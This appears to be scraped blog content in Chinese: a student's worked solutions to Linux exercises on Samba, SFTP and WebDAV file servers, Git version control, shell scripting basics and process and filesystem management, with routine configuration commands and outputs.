SMB（Server Message Block）/CIFS（Common Internet File System） 是一种网络文件共享协议，主要用于在局域网内实现文件和打印机等资源的共享。它允许不同计算机之间通过网络访问彼此的文件、目录，就像访问本地文件一样方便 典型应用场景：在 Windows 网络环境中，如，在企业内部的 Windows 办公网络里，员工的电脑可以通过 SMB 协议访问文件服务器上的共享文件夹，实现文档的集中存储和多人协作编辑；学校的计算机教室中，教师机能通过该协议向学生机共享教学资料等 CIFS 脱胎于 SMB，CIFS 兼容性较好，是不同操作系统和网络环境提供一种通用的文件共享解决方案 SFTP（SSH File Transfer Protocol） 基于 SSH（Secure Shell）的文件传输协议，它利用 SSH 的安全特性，在文件传输过程中提供加密保护，确保数据在网络传输时的安全性，防止被窃听或篡改。 典型应用场景：常用于 Linux 系统以及跨平台环境下的安全文件传输。比如，在 Linux 服务器之间进行文件备份和同步时、在开发者需要从本地向远程 Linux 服务器上传代码或下载日志文件时，使用 SFTP 可以保证传输的文件不被非法获取 区别 SMB/CIFS：Windows 网络原生，使用方便；局域网环境下，传输文件高效；但是安全性有所不足 SFTP：兼容性较好；由于加密消耗，性能会有所下降；功能相对来说比较单一，专注于文件上传、下载；基于 ssh 协议，数据传输稳定、可靠 具体操作： 描述 SMB/CIFS 的典型应用场景（例如在 Windows 网络中）。 描述 SFTP 的典型应用场景（例如在 Linux 和跨平台环境中）。 Samba 服务配置（SMB/CIFS） 任务：安装并配置 Samba，实现局域网内文件的共享访问。\n具体操作：\n在你的 Linux 服务器上安装 Samba。 sudo yum install samba samba-client samba-common\n创建一个专用于 Samba 的用户，并设置密码。 1 2 3 [root@localhost frps]# sudo useradd sambauser [root@localhost frps]# sudo smbpasswd -a sambauser ...... 修改 /etc/samba/smb.conf 配置文件，创建一个共享目录，并确保只有你创建的用户可以访问。 1 2 3 4 5 6 sudo mkdir -p /home/samba/share sudo chown sambauser:sambauser /home/samba/share sudo chmod 755 /home/samba/share sudo vim /etc/samba/smb.conf # 重启生效 sudo systemctl restart smb nmb 1 2 3 4 5 6 7 8 [myshare] # smb.conf comment = My Samba Share path = /home/samba/share valid users = sambauser writable = yes browseable = yes create mask = 0755 directory mask = 0755 验证：在另一台局域网内的电脑（例如 Windows 或 macOS）上，通过网络邻居或文件管理器访问你的共享目录，并上传一个文件进行测试。 Windows 需要在控制面版里启用 SMB、重启\n注意：直接在地址栏输入\\\\192.168.109.100 即可！！\n上传了一个文件到 sambauser，OK\nSFTP 服务配置 任务：利用 SSH 服务配置 SFTP，实现安全的文件传输和管理。\n具体操作：\n确保你的服务器上已安装 SSH 服务。 sudo yum install openssh-server\n创建一个专用于 SFTP 的新用户，并设置密码。 修改 /etc/ssh/sshd_config 文件，配置 SFTP 子系统，并限制 SFTP 用户只能访问其主目录，无法登录 Shell。 1 2 3 4 5 6 7 8 sudo systemctl start sshd sudo useradd sftpuser sudo usermod -s /sbin/nologin sftpuser # 限制登录系统 shell！ cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak # 备份一下配置文件 vi /etc/ssh/sshd_config sudo systemctl restart sshd # 重启生效 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 注释掉原来的 SFTP 子系统配置 # Subsystem sftp /usr/lib/openssh/sftp-server # 配置新的 SFTP 子系统，使用 internal-sftp # 相比原来的 sftp-server，更便于配置和限制。 Subsystem sftp internal-sftp # 匹配 SFTP 用户（这里是 sftpuser） # 对用户 sftpuser 应用后续的配置 Match User sftpuser # 强制使用 internal-sftp,无法执行 shell ForceCommand internal-sftp # 限制用户只能访问其主目录 ChrootDirectory %h # 允许用户进行的操作，这里设置为允许读写等 # 禁止 TCP 转发和 X11 转发，增强安全性 AllowTcpForwarding no X11Forwarding no # 这下面还有配置，要剪切到前面，不能放在 Match 下面！ 验证：使用一个 SFTP 客户端（例如 FileZilla 或 WinSCP）连接到你的服务器，使用 SFTP 用户登录，尝试上传文件，并确认无法执行 Shell 命令。 碰到的一些问题 需要将 ChrootDirectory（即目录，/home/sftpuser，两级都一样） 的权限设置为 755，并且归属于 root sudo chown root:root /home/sftpuser sshd -t 检查 config 的语法、看日志，又发现 usedns 不能在 matchuser 块内，移动一下 就可以了 权限精细化管理 任务：在 Samba 共享中，配置更细致的权限。\n具体操作：\n创建一个 Samba 组。 1 2 3 4 5 6 sudo groupadd sambagrp # 添加系统组 sudo smbgroupadd sambagrp # 添加 samba 组 sudo mkdir -p /home/samba/groupshare # 共享目录 sudo chgrp sambagrp /home/samba/groupshare # 归组 sudo chmod 770 /home/samba/groupshare # 设置权限 sudo vim /etc/samba/smb.conf 1 2 3 4 5 6 7 8 9 [groupshare] comment = Group Share Directory path = /home/samba/groupshare valid users = @sambagrp write list = @sambagrp browseable = yes read only = no create mask = 0660 directory mask = 0770 1 2 3 4 5 sudo systemctl restart smb nmb # 重启一下 # 加一个用户 sudo useradd groupuser1 sudo usermod -a -G sambagrp groupuser1 # a 是添加，G是修改用户所属的扩展群 sudo smbpasswd -a groupuser1 配置一个共享目录，允许该组内的所有用户读写，但禁止其他用户访问。 验证：用一个新用户尝试访问，确认其被拒绝；用组内用户访问，确认可以正常读写。 1 2 net use # 看连了什么 net use \\\\192.168.109.100 /delete # 先把原来的断开 WebDAV 配置 任务：搭建一个支持 WebDAV 协议的文件服务器，通过 HTTP/HTTPS 协议访问文件。\n具体操作：\n选择一个支持 WebDAV 的工具（例如 Nginx 或 Caddy），进行安装。 1 2 3 4 5 6 7 8 #wget https://github.com/caddyserver/caddy/releases/download/v2.7.6/caddy_2.7.6_linux_amd64.tar.gz #tar -xzf caddy_2.7.6_linux_amd64.tar.gz #sudo mv caddy /usr/bin/ # 失败了，还是用 docker 吧 sudo mkdir -p /var/www/webdav sudo chown -R $USER:$USER /var/www/webdav # 设置目录所有者，方便后续操作 vi ~/caddy-webdav/Caddyfile # 也失败了，插件不会配，专用 Nginx 参考 如何在 CentOS 7 服务器上通过 Nginx 部署 WebDAV\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 下载nginx wget1 https://github.com/nginx/nginx/archive/refs/tags/release-1.26.3.tar.gz # 解压nginx tar xvf release-1.26.3.tar.gz # 切换到nginx目录，下载nginx-dav-ext-module cd nginx-release-1.26.3/ wget1 https://github.com/arut/nginx-dav-ext-module/archive/refs/tags/v3.0.0.tar.gz # 解压nginx-dav-ext-module tar -xvf v3.0.0.tar.gz # 编辑安装 nginx，并且要指定插件！注意路径 auto/configure --prefix=/etc/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --sbin-path=/usr/sbin/nginx \\ --pid-path=/var/run/nginx.pid \\ --lock-path=/var/run/nginx.lock \\ --error-log-path=/var/log/nginx/error.log \\ --http-log-path=/var/log/nginx/access.log \\ --with-stream --with-http\\_dav\\_module --with-http\\_ssl\\_module --with-http\\_v2\\_module \\ --add-module=./nginx-dav-ext-module-3.0.0 # 编译剩余步骤 make \u0026amp;\u0026amp; make install nginx -V # 验证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # vim /lib/systemd/system/nginx.service [Unit] Description=A high performance web server and a reverse proxy server Documentation=man:nginx(8) After=network.target nss-lookup.target [Service] Type=forking PIDFile=/run/nginx.pid # master... 要删掉！ ExecStartPre=/usr/sbin/nginx -t -q -g \u0026#39;daemon on; #master\\_process# on;\u0026#39; ExecStart=/usr/sbin/nginx -g \u0026#39;daemon on; #master\\_process on#;\u0026#39; ExecReload=/usr/sbin/nginx -g \u0026#39;daemon on; #master\\_process on#;\u0026#39; -s reload ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid TimeoutStopSec=5 KillMode=mixed [Install] WantedBy=multi-user.target 1 2 3 4 5 # 重加载systemd配置 systemctl daemon-reload systemctl enable nginx.service systemctl start nginx.service systemctl status nginx.service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # vim /etc/nginx/nginx.conf server { listen 8089; listen [::]:8089; server\\_name localhost; # 认证方式 auth\\_basic realm\\_name; # 存放认证用户名、密码文件 auth\\_basic\\_user\\_file /etc/nginx/.webdav/auth.list; # webdav服务访问的根目录 root /cherry\\_data; dav\\_methods PUT DELETE MKCOL COPY MOVE; dav\\_ext\\_methods PROPFIND OPTIONS LOCK UNLOCK; dav\\_access user:rw group:rw all:r; client\\_body\\_temp\\_path /tmp/webdav; client\\_max\\_body\\_size 0; create\\_full\\_put\\_path on; #添加索引指令，如果忘记这项配置，nginx访问会提示403 location /{ root /cherry\\_data; autoindex on; autoindex\\_format html; autoindex\\_exact\\_size off; autoindex\\_localtime on; charset utf-8,gbk; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 # 最后 nginx -s reload cd /etc/nginx/ mkdir .webdav cd .webdav/ # 设置用户名为admin echo -n \u0026#39;admin:\u0026#39; | tee -a auth.list openssl passwd -apr1 | tee -a auth.list Password: #首次输入 Verifying - Password: #再次输入 mkdir /cherry\\_data chmod 777 /cherry\\_data # 访问的目录 配置一个 WebDAV 共享目录，并设置基础认证。 验证：使用支持 WebDAV 的客户端（例如 Windows 的网络位置）或浏览器访问，输入用户名和密码，确认可以管理文件。 用 windows 映射挂载的时候，发现不能用 http 协议，得改一下注册表 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WebClient\\Parameters BasicAuthLevel 1改2 Win + R，services.msc；Webclent 重启 性能与安全性 任务：对你的文件服务器进行简单的性能测试和安全加固。\n具体操作：\n性能：使用 dd 命令或其他工具，测试在 Samba 和 SFTP 上传大文件的速度，并进行简单对比。 Samba:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS C:\\Users\\calendar\\Downloads\u0026gt; fsutil file createnew ./test 1073741824 已创建文件 C:\\Users\\calendar\\Downloads\\test PS C:\\Users\\calendar\\Downloads\u0026gt; Measure-Command { Copy-Item -Path \u0026#34;C:\\Users\\calendar\\Downloads\\test\u0026#34; -Destination \u0026#34;\\\\192.168.109.100\\groupshare\u0026#34; } Days : 0 Hours : 0 Minutes : 0 Seconds : 9 Milliseconds : 823 Ticks : 98231516 ...... TotalSeconds : 9.8231516 TotalMilliseconds : 9823.1516 stfp:\n安全：\n为 SFTP 服务配置基于密钥的认证，禁用密码登录。 密钥工具生成密钥，sftpuser / .ssh 目录，创建 authorized_keys 文件，将复制的公钥内容粘贴进去并保存。\n禁用密码：PasswordAuthentication 设置为 no\n简要说明这种认证方式比密码认证更安全的原因。 密码认证存在被暴力破解、泄露等风险；而基于密钥的认证使用非对称加密，私钥仅存于客户端且难以破解，公钥即使暴露也无法用于登录，极大提升了安全性，能有效防范密码相关的攻击手段。\n","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/","title":"御林招新题：文件服务器"},{"content":"安装与配置 Git 在你的 Linux 操作系统上，安装 Git。 全局配置：配置你的全局用户名和邮箱，这是 Git 记录提交者信息所必需的。 验证：执行 git --version 命令，确认 Git 已正确安装。 1 2 3 4 [root@localhost hello]# git config --global user.name \u0026#34;calendar\u0026#34; [root@localhost hello]# git config --global user.email \u0026#34;1131821081@qq.com\u0026#34; [root@localhost hello]# git --version git version 1.8.3.1 创建与克隆仓库 本地仓库：在你的主目录下创建一个新的文件夹，并在其中初始化一个 Git 仓库。 远程克隆：找一个公开的 Git 仓库（例如 GitHub 上的一个开源项目），使用 git clone 命令将其克隆到本地。 这里还配置了一下 clash，记一下命令：\n1 2 3 4 5 6 7 8 9 10 11 $ clashctl + ... Usage: clash 命令一览 clashon 开启代理 clashoff 关闭代理 clashui 面板地址 clashstatus 内核状况 clashtun [on|off] Tun 模式 clashmixin [-e|-r] Mixin 配置 clashsecret [secret] Web 密钥 clashupdate [auto|log] 更新订阅 1 2 3 4 5 6 7 [root@localhost git_repo]# git clone https://github.com/calendar0917/learning_log.git Cloning into \u0026#39;learning_log\u0026#39;... remote: Enumerating objects: 72, done. ...... Unpacking objects: 100% (72/72), done. [root@localhost git_repo]# ls clash-for-linux-install learning_log 文件的提交与同步 文件修改：在你克隆的本地仓库中，对某个文件进行修改。\n暂存与提交：\n使用 git add 命令将修改后的文件添加到暂存区。 使用 git commit 命令提交你的变更，并附上一条有意义的提交信息。 登录的时候遇到问题，发现得要用 Personal Access Token 来代替 Password，然后保存一下登录：\n1 2 3 4 # 配置凭据缓存（默认缓存15分钟） git config --global credential.helper cache # 可选：设置缓存时间（单位：秒，例如设置30天） git config --global credential.helper \u0026#39;cache --timeout=2592000\u0026#39; 同步操作：\n使用 git pull 命令从远程仓库拉取最新的变更。 使用 git push 命令将你的本地提交推送到远程仓库。 1 2 3 4 5 6 7 [root@localhost learning_log]# git push ...... Username for \u0026#39;https://github.com\u0026#39;: calendar0917 Password for \u0026#39;https://calendar0917@github.com\u0026#39;: ...... remote: To https://github.com/calendar0917/learning_log.git 1d476d9..5a31feb main -\u0026gt; main 验证：在远程仓库页面上，确认你的提交历史已成功显示。\n分支管理 目标：理解分支的作用，掌握创建、切换和合并分支的操作。 在一个分支上进行的代码修改不会影响其他分支，进行实验性的开发，能回退到原来的状态。\n挑战：\n创建一个名为 feature-a 的新分支。 git branch name 新建分支\ngit checkout name 跳转分支\ngit checkout -b name 创建并跳转分支\n在新分支上对文件进行修改并提交。 1 2 3 4 5 6 7 8 [root@localhost learning_log]# git branch feature-a [root@localhost learning_log]# git checkout feature-a Switched to branch \u0026#39;feature-a\u0026#39; [root@localhost learning_log]# vi hello.txt [root@localhost learning_log]# git add hello.txt [root@localhost learning_log]# git commit -m \u0026#34;来自feature-a的修改\u0026#34; [feature-a 44b4133] 来自feature-a的修改 1 file changed, 1 insertion(+) 切换回主分支（main 或 master）。 使用 git merge 命令将 feature-a 分支的修改合并到主分支上。 删除 feature-a 分支。 1 2 3 4 5 6 7 8 9 10 11 12 [root@localhost learning_log]# git branch * feature-a main [root@localhost learning_log]# git checkout main Switched to branch \u0026#39;main\u0026#39; [root@localhost learning_log]# git merge feature-a Updating 5a31feb..44b4133 Fast-forward hello.txt | 1 + 1 file changed, 1 insertion(+) [root@localhost learning_log]# git branch -d feature-a Deleted branch feature-a (was 44b4133). 历史记录与回溯 目标：学会查看提交历史，并在需要时回溯到特定版本。\n挑战：\n使用 git log 命令查看你的提交历史。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [root@localhost learning_log]# git log commit 44b413353e383dcbc0063558f1ce87e544c7730b Author: calendar \u0026lt;1131821081@qq.com\u0026gt; Date: Sat Oct 18 05:54:50 2025 -0700 来自feature-a的修改 commit 5a31feb5ae61d40b7d6d7eaff991b5c3eeb82892 Author: calendar \u0026lt;1131821081@qq.com\u0026gt; Date: Sat Oct 18 05:38:50 2025 -0700 测试暂存与提交 commit 1d476d982a3144004612cc9162b83b6483e42faa Author: calendar0917 \u0026lt;1131821081@qq.com\u0026gt; Date: Thu Feb 13 11:10:55 2025 +0800 Initial commit 找到一个较早的提交 ID。 使用 git reset 或 git revert 命令将代码库回溯到该提交版本，并解释你所用命令的区别。 知识：\n工作区和暂存区： 工作区：可见的实际存放项目文件的目录 暂存区：一个临时保存文件修改的区域，它是位于 .git 目录中的一个文件（在.git/index） ，并不是一个实际可视化的文件夹。Git 利用暂存区来管理文件的状态，决定哪些文件的修改会被包含在下一次提交中。 使用 git add 命令后，工作区中已修改的文件会被添加到暂存区，文件进入已暂存状态。暂存区只记录那些即将被提交到版本库的文件修改信息 。 git revert: 原理是创建一个新的提交，用来抵消目标提交所做的修改。（对后面的修改不影响，且不修改历史记录） git reset： 用于将当前分支的 HEAD 指针重置到指定的提交版本，同时可以选择如何处理工作区和暂存区的文件 --hard 模式：将 HEAD 指针、暂存区和工作区都重置到指定提交版本 --soft 模式：仅将 HEAD 指针重置到指定提交版本，暂存区和工作区的内容保持不变 假设你有一串零散的提交（比如修复同一个功能的多次小修改），想把它们合并成一个清晰的大提交，--soft 模式非常合适 刚执行了 git commit，但发现提交信息写错了，或者想补充修改后再提交 --mixed 模式：将 HEAD 指针和暂存区重置到指定提交版本，工作区内容不变。 实操： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # 报错了，用 git status 看原因 [root@localhost learning_log]# git revert 5a31feb5ae61d40b7d6d7eaff991b5c3eeb82892 error: could not revert 5a31feb... 测试暂存与提交 hint: after resolving the conflicts, mark the corrected paths hint: with \u0026#39;git add \u0026lt;paths\u0026gt;\u0026#39; or \u0026#39;git rm \u0026lt;paths\u0026gt;\u0026#39; hint: and commit the result with \u0026#39;git commit\u0026#39; [root@localhost learning_log]# git status # On branch main --\u0026gt; 所在分支、状态 # Your branch is ahead of \u0026#39;origin/main\u0026#39; by 1 commit. # (use \u0026#34;git push\u0026#34; to publish your local commits) # # You are currently reverting commit 5a31feb. --\u0026gt; 正在进行的操作 # (fix conflicts and run \u0026#34;git revert --continue\u0026#34;) # (use \u0026#34;git revert --abort\u0026#34; to cancel the revert operation) # # Unmerged paths: --\u0026gt; 报错的地方，5a31feb 中创建了 hello.txt,这里需要手动删除才可以 # (use \u0026#34;git reset HEAD \u0026lt;file\u0026gt;...\u0026#34; to unstage) # (use \u0026#34;git add/rm \u0026lt;file\u0026gt;...\u0026#34; as appropriate to mark resolution) # # deleted by them: hello.txt # 手动删除 [root@localhost learning_log]# git rm hello.txt hello.txt: needs merge [root@localhost learning_log]# git revert --continue [main 49e231f] Revert \u0026#34;测试暂存与提交\u0026#34; 1 file changed, 2 deletions(-) delete mode 100644 hello.txt [root@localhost learning_log]# git push ...... 远程仓库进阶 目标：管理多个远程仓库，并实现不同仓库间的同步。 挑战： 为你的本地仓库添加第二个远程仓库（例如，一个 GitHub 仓库和一个 Gitee 仓库）。 将你的本地分支推送到这两个不同的远程仓库。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # 查看并添加远程仓库 [root@localhost learning_log]# git remote -v origin https://github.com/calendar0917/learning_log.git (fetch) origin https://github.com/calendar0917/learning_log.git (push) [root@localhost learning_log]# git remote add gitee https://gitee.com/calendar917/learning_log.git [root@localhost learning_log]# git remote -v gitee https://gitee.com/calendar917/learning_log.git (fetch) gitee https://gitee.com/calendar917/learning_log.git (push) origin https://github.com/calendar0917/learning_log.git (fetch) origin https://github.com/calendar0917/learning_log.git (push) # push 到gitee上 [root@localhost learning_log]# git push gitee main Username for \u0026#39;https://gitee.com\u0026#39;: calendar917 Password for \u0026#39;https://calendar917@gitee.com\u0026#39;: Counting objects: 10, done. ...... To https://gitee.com/calendar917/learning_log.git * [new branch] main -\u0026gt; main 标签使用 git restore（Git 2.23+ 新增）\n核心作用：恢复工作区或暂存区（index）的文件内容，不影响提交历史。可以理解为 “撤销对文件的修改”，直接操作文件内容，而非提交记录。\n保存一步： git add . git commit -m \u0026quot;描述\u0026quot;\n恢复任意状态： git log --oneline 找编号 git restore --source=编号 . git add .\n打标签： git tag 标签名 提交号\n恢复标签： git restore --source=标签名 .\n删标签： git tag -d 标签名\n","date":"2025-10-18T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251021193834987.png","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-git%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/","title":"御林招新题：Git 版本管理"},{"content":"重定向与管道 了解标准输入、标准输出、标准错误的概念。 标准输入（Standard Input，stdin）：默认是键盘，是程序获取输入数据的地方。例如，cat命令如果没有指定文件，就会从标准输入读取内容，此时你可以在键盘上输入文字，输入结束后按Ctrl + D（类 Unix 系统）表示输入结束，cat会将输入的内容输出。 标准输出（Standard Output，stdout）：默认是终端屏幕，是程序输出正常结果的地方。比如执行ls命令，会在终端显示当前目录下的文件和文件夹列表。 标准错误（Standard Error，stderr）：默认也是终端屏幕，用于输出程序的错误信息。例如，执行ls /nonexistent（假设/nonexistent是不存在的目录），会在终端显示类似ls: cannot access '/nonexistent': No such file or directory的错误信息，这就是标准错误输出。 使用 \u0026gt; 和 \u0026gt;\u0026gt; 操作符将命令的输出重定向到文件。 \u0026gt;操作符：用于将命令的标准输出重定向到文件，如果文件已存在，会覆盖文件原有内容；如果文件不存在，会创建新文件。 \u0026gt;\u0026gt;操作符：用于将命令的标准输出以追加的方式重定向到文件，即把输出内容添加到文件原有内容的末尾，不会覆盖原有内容。 使用 2\u0026gt; 或 2\u0026gt;\u0026gt; 操作符将标准错误重定向到文件。 1 2 3 4 5 [root@localhost hello]# ls /invalid 2\u0026gt; error.txt [root@localhost hello]# ls /invalid_2 2\u0026gt;\u0026gt; error.txt [root@localhost hello]# cat error.txt ls: cannot access /invalid: No such file or directory ls: cannot access /invalid_2: No such file or directory 使用 | 管道操作符将一个命令的输出作为另一个命令的输入。 1 2 3 [root@localhost hello]# ls | grep \u0026#39;txt\u0026#39; digit_count.txt error.txt 变量与引号 学习如何在 Shell 中定义、引用和取消定义变量。 定义变量：基本语法是：变量名=值，等号两边不能有空格。\n引用变量：使用 $变量名 或者 ${变量名} 的形式。\n取消定义变量\n使用 unset 命令可以取消定义变量，语法为：unset 变量名。\n理解单引号 (')、双引号 (\u0026quot;) 和反引号 (``) 的区别与作用。 单引号（'）：用于包裹字符串，单引号内的所有内容都被视为普通字符，不会进行变量替换、命令替换等操作。\n**双引号（\u0026quot;）：**双引号内会进行变量替换和命令替换（需要结合$()或反引号）\n**反引号（`）**：反引号主要用于命令替换，即执行反引号内的命令，并将命令的输出作为结果返回。不过现在更推荐使用$()`来进行命令替换，因为它的可读性更好，而且可以嵌套使用（反引号嵌套使用比较复杂）。\n参数与条件判断 了解如何获取命令行参数（例如 $1, $2, $#）。 $1、$2、$3……：分别表示第 1 个、第 2 个、第 3 个…… 命令行参数。 $#：表示命令行参数的个数。 $0：表示脚本本身的名称。 $\\*：把所有的命令行参数当作一个整体的字符串 $@：把每个命令行参数当作独立的字符串 掌握基本的条件判断语句（if 语句）。 1 2 3 4 5 6 7 if [条件1]; then # 条件1为真时执行的命令 elif [条件2]; then # 条件2为真时执行的命令 else # 所有条件都为假时执行的命令 fi 使用 test 或 [] 进行文件、字符串或数字的比较。 test 命令和 []（方括号）在 Shell 中用于进行条件测试，可以对文件、字符串、数字等进行比较。[] 是 test 命令的另一种写法，使用起来更简洁。\n文件： -e 存在、-f 普通文件、-d 目录、-r 可读、-w 可写、-x 可执行 字符串： = 相等、！=不等、-z 长度是否为0、-n 长度是否不为零 数字： -eq 相等、-ne 不相等、-gt 大于、-ge 大于等于、-lt 小于、-le 小于等于 循环 学习 for 循环和 while 循环的基本用法。 1 2 3 4 5 6 7 for 变量 in 元素1 元素2 元素3 ...; do # 循环体，对每个元素执行的操作 done for 变量 in {起始值..结束值}; do # 循环体 done 1 2 3 while 条件; do # 循环体，条件为真时执行的操作 done 能够编写简单的循环脚本来处理文件列表或执行重复任务。 编写一个 Shell 脚本，实现以下功能： 参数检查：\n检查脚本是否接收到至少一个命令行参数。如果没有，打印使用说明（例如：Usage: ./file_processor.sh \u0026lt;directory\u0026gt;）并退出。 目录遍历：\n脚本接收一个目录路径作为参数。进入该目录后，使用 for 循环遍历目录下的所有文件。 文件处理：\n对于遍历到的每一个文件，进行以下判断：\n如果文件是普通文件（非目录），则将该文件的文件名（不包含路径）打印到标准输出。\n如果文件是可执行文件，则在文件名后面追加 (Executable) 字样。\n结果输出：\n将所有被处理的文件的输出结果（包含可执行标记）重定向到一个名为 processed_files.txt 的新文件中。\n最后，打印一句话，提示用户处理已完成，并说明结果已保存在 processed_files.txt 中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/bin/bash # 判断是否未传入任何参数 if [ -z \u0026#34;$*\u0026#34; ]; then echo \u0026#39;Usage： ./file_processor.sh \u0026lt;directory\u0026gt;\u0026#39; echo \u0026#39;是不是没有写文件路径？\u0026#39; # 判断传入的参数是否为目录 elif [ -d \u0026#34;$1\u0026#34; ]; then # 遍历目录下的所有文件 for file in \u0026#34;$1\u0026#34;/*; do # 判断是否为普通文件 if [ -f \u0026#34;$file\u0026#34; ]; then echo -n \u0026#34;$file\u0026#34; echo -n \u0026#34;$file\u0026#34; \u0026gt;\u0026gt; processed_files.txt # 判断文件是否可执行 if [ -x \u0026#34;$file\u0026#34; ]; then echo -n \u0026#39;Executable\u0026#39; echo -n \u0026#39;Executable\u0026#39; \u0026gt;\u0026gt; processed_files.txt fi fi echo \u0026#39;\u0026#39; # 美化的作用 done echo \u0026#39;批处理已完成，结果已保存在 processed_files.txt 中\u0026#39; echo \u0026#39;-----------------\u0026#39; else echo \u0026#39;是不是文件夹路径输错了？\u0026#39; fi 写错的点：\n[ -z $* ]，要先写 -\u0026lt;...\u0026gt; $file 忘记改单引号为双引号了 $1 只是目录路径，\u0026quot;$1\u0026quot;/* 才是目录下所有文件 echo 默认带换行，添加 -n 参数取消 结果如下图：\n又发现 .txt 中没有换行，得添加一下手动换行\n","date":"2025-10-18T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-shell%E5%85%A5%E9%97%A8/","title":"御林招新题：shell 入门"},{"content":"小结 ps 命令查看进程 losf、netstat 查看端口进程号 kill 终结进程 Linux 文件结构 grep + 正则 + 管道查找指定内容 wc 统计字符 自动化脚本 .sh systemctl 控制 service 终止 内核模块 lsmod 列出 modprobe 控制 btrfs 控制磁盘、分卷 mount 挂载 snapshot 创建快照、回滚 journalctl 查看、删除日志文件 sysctl 查看、修改内核参数 控制 TCP 最大连接数：net.core.somaxconn \u0026amp; net.ipv4.tcp_max_syn_backlog 系统与进程管理 特殊进程：描述进程号为 1 的特殊进程是什么，以及它在系统中的作用。 进程号为 1 的特殊进程在类 Unix 系统（如 Linux）中通常是init进程\n作用：它是系统启动后创建的第一个用户空间进程，是所有其他进程的祖先进程。负责系统初始化，比如启动各种服务、设置运行级别等，系统关闭时也由它来完成相关收尾工作，确保系统各部分有序启动和停止。 由 0 进程创建，内核启动 -\u0026gt; init启动 -\u0026gt; 启动其他进程 进程状态：使用 ps 命令查看所有活跃进程，并分析其父子关系。 1 2 3 4 5 [root@localhost ~]# ps -A -f UID PID PPID C STIME TTY TIME CMD root 1 0 0 23:25 ? 00:00:03 /usr/lib/systemd/systemd --switched-root --syste root 2 0 0 23:25 ? 00:00:00 [kthreadd] root 4 2 0 23:25 ? 00:00:00 [kworker/0:0H] PID：进程 ID\nPPID：进程的父 PID\n端口占用：当某个程序无法启动并提示端口已被占用时，如何通过命令行找出占用该端口的进程号（PID）并终止它。 查看端口进程：\nlsof（List Open Files ） netstat（Network Statistics） netstat | grep PID -t：显示 TCP 协议的连接 / 端口（Transmission Control Protocol，传输控制协议）。 -u：显示 UDP 协议的连接 / 端口（User Datagram Protocol，用户数据报协议）。 -l：仅显示 处于监听状态 的端口（即等待外部连接的端口，而非已建立的连接）。 -p：显示 占用端口的进程信息（包括进程 ID 和进程名），需要 root 权限才能完整显示。 -n：以 数字形式 显示 IP 地址和端口号（而非域名或服务名，例如直接显示 127.0.0.1:8080 而非 localhost:http-alt）。 终止：\nkill -pid PID 强制终止进程 网络与文件系统 文件系统结构：描述 Linux 文件系统（例如 ext4）的基本目录结构和作用，并解释根目录 / 和 /home 的区别。 基本目录结构：树形\n/（根目录）：最顶层目录，所有其他目录和文件都从这里开始分支，包含了系统运行所需的所有核心文件和目录，一般情况下普通用户只能读取 /home：是普通用户的主目录集合，每个普通用户在系统中都有一个以自己用户名命名的子目录（如用户 user1 的主目录是 /home/user1）。用户在自己的主目录下有完全的操作权限，可以存储个人文件、配置个人环境等，不会影响系统的核心部分。 /bin：存放系统的基本命令，这些命令是二进制可执行文件，普通用户和超级用户都可以执行，用于完成基本的系统操作，如 ls（列出目录内容）、cp（复制文件）等。 /sbin：存放系统管理命令，通常只有超级用户（root）才能执行，用于系统管理和维护，如 ifconfig（配置网络接口）、shutdown（关闭系统）等。 /etc：存放系统的配置文件，包括系统服务配置、用户配置、网络配置等，如 passwd（用户账户信息）、fstab（文件系统挂载配置）等。 /dev：存放设备文件，Linux 把所有的硬件设备都抽象为文件，通过这些文件可以访问和控制硬件设备，如 sda（第一块硬盘）、tty1（第一个终端）等。 /proc：是一个虚拟文件系统，它不占用实际的磁盘空间，而是反映系统当前的运行状态，包含了进程信息、内存使用情况等，如 /proc/cpuinfo（CPU 信息）、/proc/meminfo（内存信息）等。 /usr：存放用户安装的应用程序和文件，类似于 Windows 系统中的 “Program Files” 目录，包含了大量的应用程序、库文件、文档等。 /var：存放经常变化的文件，如日志文件（/var/log）、邮件（/var/mail）、打印队列（/var/spool）等。 /tmp：存放临时文件，系统重启后这里的文件会被清除，用于程序运行时临时存储数据。 GRUB：什么是 GRUB？它在 Linux 系统启动中扮演了什么角色？ Grand Unified Bootloader 统一引导加载程序\n系统启动引导：计算机开机后，首先由 BIOS（基本输入输出系统）或 UEFI（统一可扩展固件接口）进行硬件检测和初始化，然后会将引导加载程序（GRUB）加载到内存中运行。GRUB 负责加载 Linux 内核，并将系统控制权转交给内核，从而启动 Linux 系统。 多系统引导：如果计算机上安装了多个操作系统（如同时安装了 Linux 和 Windows），GRUB 可以提供一个启动菜单，让用户选择要启动的操作系统。 内核参数设置：在系统启动时，用户可以通过 GRUB 的启动菜单，临时修改内核的启动参数，这对于系统调试、故障排除（如单用户模式启动）等非常有用。 文件内容处理 查找模式：使用 grep 命令在 /etc/passwd 文件中，找出所有以 t 开头的文本行。 1 2 3 [root@localhost ~]# grep \u0026#39;^t\u0026#39; /etc/passwd 